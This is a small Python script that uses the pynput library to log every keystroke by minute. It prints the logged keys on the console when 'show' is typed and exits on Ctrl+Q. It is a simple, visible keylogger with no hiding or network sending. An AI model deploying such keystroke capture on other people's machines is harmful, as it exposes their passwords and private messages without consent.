from pynput.keyboard import Listener, Key
import time

keys_by_time = {}
recent_keys = []
current_keys = set()

def on_press(key):
    global current_keys
    date = time.strftime("%d/%m/%Y, %H:%M")

    try:
        tap = str(key.char)
    except AttributeError:
        tap = str(key)

    if date in keys_by_time:
        keys_by_time[date] += tap
    else:
        keys_by_time[date] = tap

    recent_keys.append(tap.lower())
    printer = ''.join(recent_keys[-4:])
    if printer == 'show':
        print({date: keys_by_time[date]})

    current_keys.add(key)
    if Key.ctrl in current_keys and tap.lower() == 'q':
        print({date: keys_by_time[date]})
        print("Exiting...")
        exit()

def on_release(key):
    if key in current_keys:
        current_keys.remove(key)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
